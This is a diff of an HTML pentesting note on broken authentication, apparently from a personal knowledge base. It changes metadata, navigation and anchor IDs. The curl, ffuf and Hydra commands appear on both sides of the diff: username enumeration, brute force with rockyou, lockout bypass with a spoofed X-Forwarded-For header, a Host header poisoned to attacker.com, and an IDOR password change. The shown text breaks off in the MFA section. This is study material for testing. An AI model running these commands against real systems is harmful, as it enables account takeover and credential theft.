@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:55 -->
+<!-- 2026-07-30 Thu 22:14 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Broken Authentication</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,32 +886,32 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org7142d31">1. Username Enumeration</a>
+<li><a href="#org9cdbb31">1. Username Enumeration</a>
 <ul>
-<li><a href="#org40a7603">Login Form</a></li>
-<li><a href="#orgef35254">Registration Form</a></li>
-<li><a href="#orgad61474">Password Reset Form</a></li>
-<li><a href="#org03a269c">Automating Enumeration</a></li>
+<li><a href="#orgeb1987d">Login Form</a></li>
+<li><a href="#orgc3e979c">Registration Form</a></li>
+<li><a href="#org1d59f14">Password Reset Form</a></li>
+<li><a href="#orgf0eea4c">Automating Enumeration</a></li>
 </ul>
 </li>
-<li><a href="#orgf657f05">2. Brute Force / Rate Limiting</a>
+<li><a href="#org2bdc46f">2. Brute Force / Rate Limiting</a>
 <ul>
-<li><a href="#orga104117">Lockout Bypass</a></li>
+<li><a href="#orgec678e5">Lockout Bypass</a></li>
 </ul>
 </li>
-<li><a href="#org9e42697">3. Password Reset Flaws</a>
+<li><a href="#orgaf37257">3. Password Reset Flaws</a>
 <ul>
-<li><a href="#org6f6590c">Predictable Reset Token</a></li>
-<li><a href="#org088e0ec">Token Not Invalidated After Use</a></li>
-<li><a href="#orgb475bc4">Host Header Injection in Reset Link</a></li>
-<li><a href="#org33db247">IDOR on Password Change (Authenticated)</a></li>
+<li><a href="#org9864d0a">Predictable Reset Token</a></li>
+<li><a href="#org036879a">Token Not Invalidated After Use</a></li>
+<li><a href="#org60eb118">Host Header Injection in Reset Link</a></li>
+<li><a href="#org27e6ba3">IDOR on Password Change (Authenticated)</a></li>
 </ul>
 </li>
-<li><a href="#orgbfe87d3">4. MFA Weaknesses</a></li>
-<li><a href="#orgacf0e37">5. Weak Credential Storage</a></li>
-<li><a href="#orge2f1144">6. Testing Checklist</a></li>
-<li><a href="#orgdedb26f">7. Reporting Template</a></li>
-<li><a href="#org3d3046f">Tips</a></li>
+<li><a href="#org72b0855">4. MFA Weaknesses</a></li>
+<li><a href="#org5abac45">5. Weak Credential Storage</a></li>
+<li><a href="#orgabb5080">6. Testing Checklist</a></li>
+<li><a href="#orge1125ea">7. Reporting Template</a></li>
+<li><a href="#org5727fd6">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -916,9 +934,9 @@ Related: <a href="20260613T215303--insecure-authentication-mechanism__cybersecur
          <a href="20260611T064004--password-cracking-methodology__cybersecurity_pentesting_technique.html">Password Cracking Methodology</a>
          <a href="20260614T002010--pt1-vulnerability-classification-cheat-sheet__comparison_cybersecurity_pentesting_reference.html">PT1 Vulnerability Classification Cheat Sheet</a>
 </p>
-<div id="outline-container-org7142d31" class="outline-2">
-<h2 id="org7142d31">1. Username Enumeration</h2>
-<div class="outline-text-2" id="text-org7142d31">
+<div id="outline-container-org9cdbb31" class="outline-2">
+<h2 id="org9cdbb31">1. Username Enumeration</h2>
+<div class="outline-text-2" id="text-org9cdbb31">
 <p>
 If the application reveals whether a username exists — different
 error messages, different response times, or different status
@@ -926,15 +944,15 @@ codes — an attacker can build a valid user list before attacking
 passwords.
 </p>
 </div>
-<div id="outline-container-org40a7603" class="outline-3">
-<h3 id="org40a7603">Login Form</h3>
-<div class="outline-text-3" id="text-org40a7603">
+<div id="outline-container-orgeb1987d" class="outline-3">
+<h3 id="orgeb1987d">Login Form</h3>
+<div class="outline-text-3" id="text-orgeb1987d">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4019b3c41ec4475eafab7644fc344f3a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_88e9e3a68d244cdfabd4008a8000b1e3>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_4019b3c41ec4475eafab7644fc344f3a=document.querySelector('button[name=btn_4019b3c41ec4475eafab7644fc344f3a]');
-copyBtnbtn_4019b3c41ec4475eafab7644fc344f3a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Compare responses for known-valid vs unknown username\ncurl -s -X POST http://$IP/login -d \"username=admin&password=wrong\" -i\ncurl -s -X POST http://$IP/login -d \"username=nonexistentuser123&password=wrong\" -i\n\n# Look for differences in:\n# — Error message text (\"Invalid password\" vs \"User not found\")\n# — HTTP status code\n# — Response time (valid username may trigger a hash comparison, invalid may not)\n# — Response length\n`);copyBtnbtn_4019b3c41ec4475eafab7644fc344f3a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4019b3c41ec4475eafab7644fc344f3a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_88e9e3a68d244cdfabd4008a8000b1e3=document.querySelector('button[name=btn_88e9e3a68d244cdfabd4008a8000b1e3]');
+copyBtnbtn_88e9e3a68d244cdfabd4008a8000b1e3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Compare responses for known-valid vs unknown username\ncurl -s -X POST http://$IP/login -d \"username=admin&password=wrong\" -i\ncurl -s -X POST http://$IP/login -d \"username=nonexistentuser123&password=wrong\" -i\n\n# Look for differences in:\n# — Error message text (\"Invalid password\" vs \"User not found\")\n# — HTTP status code\n# — Response time (valid username may trigger a hash comparison, invalid may not)\n# — Response length\n`);copyBtnbtn_88e9e3a68d244cdfabd4008a8000b1e3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_88e9e3a68d244cdfabd4008a8000b1e3.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -951,15 +969,15 @@ curl -s -X POST http://$<span style="color: var(--clr-variable); background-colo
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgef35254" class="outline-3">
-<h3 id="orgef35254">Registration Form</h3>
-<div class="outline-text-3" id="text-orgef35254">
+<div id="outline-container-orgc3e979c" class="outline-3">
+<h3 id="orgc3e979c">Registration Form</h3>
+<div class="outline-text-3" id="text-orgc3e979c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0e187aba655c4405ad996943d726097c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0210740b6a5349e78d05792bf7263adf>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0e187aba655c4405ad996943d726097c=document.querySelector('button[name=btn_0e187aba655c4405ad996943d726097c]');
-copyBtnbtn_0e187aba655c4405ad996943d726097c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# \"Username already taken\" on registration confirms existence\ncurl -s -X POST http://$IP/register -d \"username=admin&password=Test123!&email=a@a.com\"\n`);copyBtnbtn_0e187aba655c4405ad996943d726097c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0e187aba655c4405ad996943d726097c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0210740b6a5349e78d05792bf7263adf=document.querySelector('button[name=btn_0210740b6a5349e78d05792bf7263adf]');
+copyBtnbtn_0210740b6a5349e78d05792bf7263adf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# \"Username already taken\" on registration confirms existence\ncurl -s -X POST http://$IP/register -d \"username=admin&password=Test123!&email=a@a.com\"\n`);copyBtnbtn_0210740b6a5349e78d05792bf7263adf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0210740b6a5349e78d05792bf7263adf.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -969,15 +987,15 @@ let res = copyTextToClipboard(`# \"Username already taken\" on registration conf
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgad61474" class="outline-3">
-<h3 id="orgad61474">Password Reset Form</h3>
-<div class="outline-text-3" id="text-orgad61474">
+<div id="outline-container-org1d59f14" class="outline-3">
+<h3 id="org1d59f14">Password Reset Form</h3>
+<div class="outline-text-3" id="text-org1d59f14">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0199e1703f8540d8be83068b70a4391c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_116a9ac3978e4471966ebacca8a7c768>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0199e1703f8540d8be83068b70a4391c=document.querySelector('button[name=btn_0199e1703f8540d8be83068b70a4391c]');
-copyBtnbtn_0199e1703f8540d8be83068b70a4391c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# \"If this email exists, a reset link was sent\" = safe\n# \"Email not found\" vs \"Reset link sent\" = enumerable\ncurl -s -X POST http://$IP/forgot-password -d \"email=admin@target.com\"\ncurl -s -X POST http://$IP/forgot-password -d \"email=nonexistent@target.com\"\n`);copyBtnbtn_0199e1703f8540d8be83068b70a4391c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0199e1703f8540d8be83068b70a4391c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_116a9ac3978e4471966ebacca8a7c768=document.querySelector('button[name=btn_116a9ac3978e4471966ebacca8a7c768]');
+copyBtnbtn_116a9ac3978e4471966ebacca8a7c768.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# \"If this email exists, a reset link was sent\" = safe\n# \"Email not found\" vs \"Reset link sent\" = enumerable\ncurl -s -X POST http://$IP/forgot-password -d \"email=admin@target.com\"\ncurl -s -X POST http://$IP/forgot-password -d \"email=nonexistent@target.com\"\n`);copyBtnbtn_116a9ac3978e4471966ebacca8a7c768.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_116a9ac3978e4471966ebacca8a7c768.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -989,15 +1007,15 @@ curl -s -X POST http://$<span style="color: var(--clr-variable); background-colo
 </div></div>
 </div>
 </div>
-<div id="outline-container-org03a269c" class="outline-3">
-<h3 id="org03a269c">Automating Enumeration</h3>
-<div class="outline-text-3" id="text-org03a269c">
+<div id="outline-container-orgf0eea4c" class="outline-3">
+<h3 id="orgf0eea4c">Automating Enumeration</h3>
+<div class="outline-text-3" id="text-orgf0eea4c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2541270916fd489aa0ca951b6a125ec1>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8152b589253c4a66acc73470480895ad>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_2541270916fd489aa0ca951b6a125ec1=document.querySelector('button[name=btn_2541270916fd489aa0ca951b6a125ec1]');
-copyBtnbtn_2541270916fd489aa0ca951b6a125ec1.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# ffuf — compare response size/words to flag valid usernames\nffuf -u http://$IP/login -X POST \\\n  -d \"username=FUZZ&password=wrong\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -w usernames.txt \\\n  -fw 12   # filter out the common \"invalid\" word count\n`);copyBtnbtn_2541270916fd489aa0ca951b6a125ec1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2541270916fd489aa0ca951b6a125ec1.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8152b589253c4a66acc73470480895ad=document.querySelector('button[name=btn_8152b589253c4a66acc73470480895ad]');
+copyBtnbtn_8152b589253c4a66acc73470480895ad.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# ffuf — compare response size/words to flag valid usernames\nffuf -u http://$IP/login -X POST \\\n  -d \"username=FUZZ&password=wrong\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -w usernames.txt \\\n  -fw 12   # filter out the common \"invalid\" word count\n`);copyBtnbtn_8152b589253c4a66acc73470480895ad.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8152b589253c4a66acc73470480895ad.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1012,20 +1030,20 @@ let res = copyTextToClipboard(`# ffuf — compare response size/words to flag va
 </div>
 </div>
 </div>
-<div id="outline-container-orgf657f05" class="outline-2">
-<h2 id="orgf657f05">2. Brute Force / Rate Limiting</h2>
-<div class="outline-text-2" id="text-orgf657f05">
+<div id="outline-container-org2bdc46f" class="outline-2">
+<h2 id="org2bdc46f">2. Brute Force / Rate Limiting</h2>
+<div class="outline-text-2" id="text-org2bdc46f">
 <p>
 Test whether the application throttles or locks out repeated
 failed attempts.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6beb8ffbea164ca1bee98614e3fbd92a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0417772e399d46b5b76d2702c4c776cd>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6beb8ffbea164ca1bee98614e3fbd92a=document.querySelector('button[name=btn_6beb8ffbea164ca1bee98614e3fbd92a]');
-copyBtnbtn_6beb8ffbea164ca1bee98614e3fbd92a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Manual test — send 10+ rapid attempts, watch for lockout or delay\nfor i in {1..15}; do\n  curl -s -o /dev/null -w \"%{http_code}\\n\" -X POST http://$IP/login \\\n    -d \"username=admin&password=wrong$i\"\ndone\n\n# If all return the same code with no increasing delay or CAPTCHA,\n# rate limiting is absent\n\n# Hydra — actual credential attack once enumeration confirms username\nhydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  $IP http-post-form \"/login:username=^USER^&password=^PASS^:Invalid credentials\" -f\n`);copyBtnbtn_6beb8ffbea164ca1bee98614e3fbd92a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6beb8ffbea164ca1bee98614e3fbd92a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0417772e399d46b5b76d2702c4c776cd=document.querySelector('button[name=btn_0417772e399d46b5b76d2702c4c776cd]');
+copyBtnbtn_0417772e399d46b5b76d2702c4c776cd.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Manual test — send 10+ rapid attempts, watch for lockout or delay\nfor i in {1..15}; do\n  curl -s -o /dev/null -w \"%{http_code}\\n\" -X POST http://$IP/login \\\n    -d \"username=admin&password=wrong$i\"\ndone\n\n# If all return the same code with no increasing delay or CAPTCHA,\n# rate limiting is absent\n\n# Hydra — actual credential attack once enumeration confirms username\nhydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  $IP http-post-form \"/login:username=^USER^&password=^PASS^:Invalid credentials\" -f\n`);copyBtnbtn_0417772e399d46b5b76d2702c4c776cd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0417772e399d46b5b76d2702c4c776cd.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1048,19 +1066,19 @@ let res = copyTextToClipboard(`# Manual test — send 10+ rapid attempts, watch 
 See <a href="20260314T005730--hydra__cybersecurity_tool.html">Hydra</a> for full syntax reference.
 </p>
 </div>
-<div id="outline-container-orga104117" class="outline-3">
-<h3 id="orga104117">Lockout Bypass</h3>
-<div class="outline-text-3" id="text-orga104117">
+<div id="outline-container-orgec678e5" class="outline-3">
+<h3 id="orgec678e5">Lockout Bypass</h3>
+<div class="outline-text-3" id="text-orgec678e5">
 <p>
 If lockout exists, test whether it can be circumvented:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_241a0102da2d46b3888dd117405ca173>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f7c5b9b81b1846ff8e29f7a90b9dd939>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_241a0102da2d46b3888dd117405ca173=document.querySelector('button[name=btn_241a0102da2d46b3888dd117405ca173]');
-copyBtnbtn_241a0102da2d46b3888dd117405ca173.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# IP rotation via X-Forwarded-For header — some apps key lockout by header, not real IP\ncurl -X POST http://$IP/login \\\n  -H \"X-Forwarded-For: 1.2.3.$RANDOM\" \\\n  -d \"username=admin&password=wrong\"\n\n# Case variation — some lockout logic is case-sensitive on username\ncurl -X POST http://$IP/login -d \"username=Admin&password=wrong\"\ncurl -X POST http://$IP/login -d \"username=ADMIN&password=wrong\"\n`);copyBtnbtn_241a0102da2d46b3888dd117405ca173.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_241a0102da2d46b3888dd117405ca173.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f7c5b9b81b1846ff8e29f7a90b9dd939=document.querySelector('button[name=btn_f7c5b9b81b1846ff8e29f7a90b9dd939]');
+copyBtnbtn_f7c5b9b81b1846ff8e29f7a90b9dd939.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# IP rotation via X-Forwarded-For header — some apps key lockout by header, not real IP\ncurl -X POST http://$IP/login \\\n  -H \"X-Forwarded-For: 1.2.3.$RANDOM\" \\\n  -d \"username=admin&password=wrong\"\n\n# Case variation — some lockout logic is case-sensitive on username\ncurl -X POST http://$IP/login -d \"username=Admin&password=wrong\"\ncurl -X POST http://$IP/login -d \"username=ADMIN&password=wrong\"\n`);copyBtnbtn_f7c5b9b81b1846ff8e29f7a90b9dd939.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f7c5b9b81b1846ff8e29f7a90b9dd939.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1077,19 +1095,19 @@ curl -X POST http://$<span style="color: var(--clr-variable); background-color: 
 </div>
 </div>
 </div>
-<div id="outline-container-org9e42697" class="outline-2">
-<h2 id="org9e42697">3. Password Reset Flaws</h2>
-<div class="outline-text-2" id="text-org9e42697">
+<div id="outline-container-orgaf37257" class="outline-2">
+<h2 id="orgaf37257">3. Password Reset Flaws</h2>
+<div class="outline-text-2" id="text-orgaf37257">
 </div>
-<div id="outline-container-org6f6590c" class="outline-3">
-<h3 id="org6f6590c">Predictable Reset Token</h3>
-<div class="outline-text-3" id="text-org6f6590c">
+<div id="outline-container-org9864d0a" class="outline-3">
+<h3 id="org9864d0a">Predictable Reset Token</h3>
+<div class="outline-text-3" id="text-org9864d0a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7d42611d66f646148e41676fede1ab08>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_fd8c8f6fcefa41d085f8ff963517fa17>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7d42611d66f646148e41676fede1ab08=document.querySelector('button[name=btn_7d42611d66f646148e41676fede1ab08]');
-copyBtnbtn_7d42611d66f646148e41676fede1ab08.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Request multiple resets, compare tokens for patterns\ncurl -X POST http://$IP/forgot-password -d \"email=test1@test.com\"\ncurl -X POST http://$IP/forgot-password -d \"email=test2@test.com\"\n# If tokens are sequential, timestamp-based, or short — guessable\n`);copyBtnbtn_7d42611d66f646148e41676fede1ab08.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7d42611d66f646148e41676fede1ab08.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_fd8c8f6fcefa41d085f8ff963517fa17=document.querySelector('button[name=btn_fd8c8f6fcefa41d085f8ff963517fa17]');
+copyBtnbtn_fd8c8f6fcefa41d085f8ff963517fa17.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Request multiple resets, compare tokens for patterns\ncurl -X POST http://$IP/forgot-password -d \"email=test1@test.com\"\ncurl -X POST http://$IP/forgot-password -d \"email=test2@test.com\"\n# If tokens are sequential, timestamp-based, or short — guessable\n`);copyBtnbtn_fd8c8f6fcefa41d085f8ff963517fa17.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fd8c8f6fcefa41d085f8ff963517fa17.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1101,15 +1119,15 @@ curl -X POST http://$<span style="color: var(--clr-variable); background-color: 
 </div></div>
 </div>
 </div>
-<div id="outline-container-org088e0ec" class="outline-3">
-<h3 id="org088e0ec">Token Not Invalidated After Use</h3>
-<div class="outline-text-3" id="text-org088e0ec">
+<div id="outline-container-org036879a" class="outline-3">
+<h3 id="org036879a">Token Not Invalidated After Use</h3>
+<div class="outline-text-3" id="text-org036879a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ad1b2d9fe3224c20818fef9989008acb>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_29dfb5f4342b470b9af79f1456f9baea>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ad1b2d9fe3224c20818fef9989008acb=document.querySelector('button[name=btn_ad1b2d9fe3224c20818fef9989008acb]');
-copyBtnbtn_ad1b2d9fe3224c20818fef9989008acb.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Use a reset token once successfully\ncurl -X POST http://$IP/reset-password \\\n  -d \"token=abc123&new_password=NewPass123!\"\n\n# Reuse the same token — should fail if properly invalidated\ncurl -X POST http://$IP/reset-password \\\n  -d \"token=abc123&new_password=AnotherPass123!\"\n`);copyBtnbtn_ad1b2d9fe3224c20818fef9989008acb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ad1b2d9fe3224c20818fef9989008acb.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_29dfb5f4342b470b9af79f1456f9baea=document.querySelector('button[name=btn_29dfb5f4342b470b9af79f1456f9baea]');
+copyBtnbtn_29dfb5f4342b470b9af79f1456f9baea.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Use a reset token once successfully\ncurl -X POST http://$IP/reset-password \\\n  -d \"token=abc123&new_password=NewPass123!\"\n\n# Reuse the same token — should fail if properly invalidated\ncurl -X POST http://$IP/reset-password \\\n  -d \"token=abc123&new_password=AnotherPass123!\"\n`);copyBtnbtn_29dfb5f4342b470b9af79f1456f9baea.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_29dfb5f4342b470b9af79f1456f9baea.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1124,15 +1142,15 @@ let res = copyTextToClipboard(`# Use a reset token once successfully\ncurl -X PO
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgb475bc4" class="outline-3">
-<h3 id="orgb475bc4">Host Header Injection in Reset Link</h3>
-<div class="outline-text-3" id="text-orgb475bc4">
+<div id="outline-container-org60eb118" class="outline-3">
+<h3 id="org60eb118">Host Header Injection in Reset Link</h3>
+<div class="outline-text-3" id="text-org60eb118">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_641d27dce8094264883073b30a202c13>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_318958d5a5554aadbe2ab93b886f77f3>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_641d27dce8094264883073b30a202c13=document.querySelector('button[name=btn_641d27dce8094264883073b30a202c13]');
-copyBtnbtn_641d27dce8094264883073b30a202c13.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# If the reset email link is built from the Host header,\n# an attacker can poison it to point to their own domain\ncurl -X POST http://$IP/forgot-password \\\n  -H \"Host: attacker.com\" \\\n  -d \"email=victim@target.com\"\n\n# Victim receives email with reset link pointing to attacker.com\n# — attacker captures the token when victim clicks it\n`);copyBtnbtn_641d27dce8094264883073b30a202c13.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_641d27dce8094264883073b30a202c13.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_318958d5a5554aadbe2ab93b886f77f3=document.querySelector('button[name=btn_318958d5a5554aadbe2ab93b886f77f3]');
+copyBtnbtn_318958d5a5554aadbe2ab93b886f77f3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# If the reset email link is built from the Host header,\n# an attacker can poison it to point to their own domain\ncurl -X POST http://$IP/forgot-password \\\n  -H \"Host: attacker.com\" \\\n  -d \"email=victim@target.com\"\n\n# Victim receives email with reset link pointing to attacker.com\n# — attacker captures the token when victim clicks it\n`);copyBtnbtn_318958d5a5554aadbe2ab93b886f77f3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_318958d5a5554aadbe2ab93b886f77f3.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1148,15 +1166,15 @@ let res = copyTextToClipboard(`# If the reset email link is built from the Host 
 </div></div>
 </div>
 </div>
-<div id="outline-container-org33db247" class="outline-3">
-<h3 id="org33db247">IDOR on Password Change (Authenticated)</h3>
-<div class="outline-text-3" id="text-org33db247">
+<div id="outline-container-org27e6ba3" class="outline-3">
+<h3 id="org27e6ba3">IDOR on Password Change (Authenticated)</h3>
+<div class="outline-text-3" id="text-org27e6ba3">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3fe5f0b1397c4cf2b17a96d8c7b0827a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9c9ac7e39c7948189c771da3a8820c43>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3fe5f0b1397c4cf2b17a96d8c7b0827a=document.querySelector('button[name=btn_3fe5f0b1397c4cf2b17a96d8c7b0827a]');
-copyBtnbtn_3fe5f0b1397c4cf2b17a96d8c7b0827a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Check if password change endpoint validates the CURRENT password\n# or trusts a user ID parameter without ownership verification\ncurl -X POST http://$IP/account/change-password \\\n  -H \"Authorization: Bearer $LOW_PRIV_TOKEN\" \\\n  -d \"user_id=1&new_password=Pwned123!\"   # user_id=1 may be another user\n`);copyBtnbtn_3fe5f0b1397c4cf2b17a96d8c7b0827a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3fe5f0b1397c4cf2b17a96d8c7b0827a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9c9ac7e39c7948189c771da3a8820c43=document.querySelector('button[name=btn_9c9ac7e39c7948189c771da3a8820c43]');
+copyBtnbtn_9c9ac7e39c7948189c771da3a8820c43.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Check if password change endpoint validates the CURRENT password\n# or trusts a user ID parameter without ownership verification\ncurl -X POST http://$IP/account/change-password \\\n  -H \"Authorization: Bearer $LOW_PRIV_TOKEN\" \\\n  -d \"user_id=1&new_password=Pwned123!\"   # user_id=1 may be another user\n`);copyBtnbtn_9c9ac7e39c7948189c771da3a8820c43.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9c9ac7e39c7948189c771da3a8820c43.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1170,15 +1188,15 @@ let res = copyTextToClipboard(`# Check if password change endpoint validates the
 </div>
 </div>
 </div>
-<div id="outline-container-orgbfe87d3" class="outline-2">
-<h2 id="orgbfe87d3">4. MFA Weaknesses</h2>
-<div class="outline-text-2" id="text-orgbfe87d3">
+<div id="outline-container-org72b0855" class="outline-2">
+<h2 id="org72b0855">4. MFA Weaknesses</h2>
+<div class="outline-text-2" id="text-org72b0855">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_c1c565c150f74a0da62eb3608754a781>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_cbca75d1e73f44389a44a1968a93cf27>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_c1c565c150f74a0da62eb3608754a781=document.querySelector('button[name=btn_c1c565c150f74a0da62eb3608754a781]');
